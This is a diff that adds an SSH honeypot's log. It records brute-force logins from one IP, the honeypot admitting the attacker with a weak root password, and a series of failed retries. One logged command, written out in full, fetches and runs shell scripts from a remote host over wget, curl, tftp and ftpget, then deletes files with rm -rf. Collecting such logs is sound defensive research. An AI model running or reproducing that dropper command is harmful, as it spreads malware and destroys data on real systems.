@@ -1,0 +1,36 @@
+2020-10-27 00:50:36.384 - [Info] MITM Version: 1.26
+2020-10-27 00:50:36.390 - [Info] Auto Access Enabled: true
+2020-10-27 00:50:36.390 - [Debug] [Init] Auto Access Barrier: true
+2020-10-27 00:50:36.413 - [Info] SSH man-in-the-middle server for 172.20.0.201 listening on 0.0.0.0:10000
+2020-10-27 00:51:05.439 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 00:51:06.458 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 00:51:06.459 - [Debug] [Auto Access] Attacker: 193.239.147.39, Threshold: 1, Attempts: 1
+2020-10-27 00:51:06.460 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-27 00:51:06.460 - [Debug] [Auto Access] Adding the following credentials: "root:1qaz@WSX"
+2020-10-27 00:51:06.609 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-27 00:51:06.610 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-10-27 00:51:22.143 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-27 00:51:22.563 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.170/h3lln3t.sh; curl -O http://45.14.224.170/h3lln3t.sh; chmod 777 h3lln3t.sh; sh h3lln3t.sh; tftp 45.14.224.170 -c get h3lln3t.sh; chmod 777 h3lln3t.sh; sh h3lln3t.sh; tftp -r h3lln3t2.sh -g 45.14.224.170; chmod 777 h3lln3t2.sh; sh h3lln3t2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.14.224.170 h3lln3t1.sh h3lln3t1.sh; sh h3lln3t1.sh; rm -rf h3lln3t.sh h3lln3t.sh h3lln3t2.sh h3lln3t1.sh; rm -rf *
+2020-10-27 00:51:52.054 - [Debug] [Connection] Attacker closed connection
+2020-10-27 00:51:52.086 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-27 00:51:52.087 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-27 00:52:04.274 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 00:52:05.497 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 00:52:05.498 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 00:52:05.499 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 00:52:05.709 - [Debug] [Connection] Attacker closed the connection
+2020-10-27 00:53:00.578 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 00:53:02.051 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 00:53:02.052 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-27 00:53:02.052 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 00:53:02.275 - [Debug] [Connection] Attacker closed the connection
+2020-10-27 00:53:56.872 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 00:53:58.293 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 00:53:58.294 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 00:53:58.295 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 00:53:58.510 - [Debug] [Connection] Attacker closed the connection
+2020-10-27 00:54:53.802 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 00:54:55.281 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 00:54:55.282 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 00:54:55.283 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 00:54:55.494 - [Debug] [Connection] Attacker closed the connection
